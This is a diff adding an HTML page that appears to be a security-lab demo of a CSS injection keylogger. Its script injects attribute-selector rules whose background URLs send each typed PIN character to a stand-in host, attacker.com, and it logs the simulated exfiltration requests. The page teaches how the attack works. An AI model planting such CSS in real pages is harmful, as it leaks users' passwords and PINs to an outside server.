@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo 11 — CSS Injection Keylogger | ZENTRIX Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/lab.css">
+<style>
+.css-stage { padding: 24px; }
+#pinInput {
+    font-size: 1.5rem; letter-spacing: 8px;
+    text-align: center; max-width: 200px;
+}
+#cssOutput { margin-top: 16px; font-size: 0.75rem; color: var(--lab-accent); }
+.leaked-chars { margin-top: 12px; padding: 12px; border: 1px dashed var(--lab-accent); min-height: 40px; }
+</style>
+</head>
+<body class="lab-demo">
+<div class="lab-warning">⚠ DEMO 11 — CSS Injection Keylogger | Authorized research only</div>
+<nav class="lab-nav">
+    <a href="index.html">← VULN LAB</a>
+    <span class="demo-id">DEMO 11 / CSS INJECTION KEYLOGGER</span>
+    <a href="../index.html">CONSOLE</a>
+</nav>
+
+<div class="lab-body">
+    <h1 class="lab-title">CSS INJECTION KEYLOGGER</h1>
+    <span class="lab-tag">CSS SELECTORS · CHAR LEAK</span>
+    <p class="lab-desc">
+        Injected CSS uses attribute selectors (input[value^="a"]) with background:url() to leak
+        each character to attacker server. Demonstrated locally via character detection log.
+    </p>
+
+    <div class="lab-stage css-stage">
+        <span class="lab-stage-label">[ TYPE PIN — chars leak via CSS rules ]</span>
+        <label style="color:var(--lab-text);font-size:0.8rem;">Enter 4-digit PIN:</label><br>
+        <input class="lab-input" id="pinInput" type="password" maxlength="4" placeholder="****" autocomplete="off">
+        <div id="cssOutput"></div>
+        <div class="leaked-chars" id="leaked">Leaked via CSS: </div>
+    </div>
+    <div class="lab-log" id="log">[*] CSS rules injected for chars a-z, 0-9. Each match = exfil request.</div>
+</div>
+
+<div class="lab-info">
+    <strong>Requires:</strong> CSS injection point + ability to load external resources. Modern browsers restrict some vectors.
+</div>
+
+<script>
+var pin = document.getElementById('pinInput');
+var leaked = '';
+var styleEl = document.createElement('style');
+document.head.appendChild(styleEl);
+
+var chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('');
+var rules = chars.map(function(c) {
+    return 'input[value$="' + c + '"] { background: url("https://attacker.com/log?char=' + c + '"); }';
+}).join('\n');
+styleEl.textContent = rules;
+
+pin.addEventListener('input', function() {
+    leaked = pin.value;
+    document.getElementById('leaked').textContent = 'Leaked via CSS: ' + (leaked || '(none)');
+    var exfil = leaked.split('').map(function(c) {
+        return 'GET https://attacker.com/log?char=' + encodeURIComponent(c);
+    }).join('\n');
+    document.getElementById('log').innerHTML =
+        '<span class="hit">[!] ' + leaked.length + ' character(s) detectable</span>\n' +
+        'Simulated exfil requests:\n' + (exfil || '(none)');
+});
+</script>
+</body>
+</html>
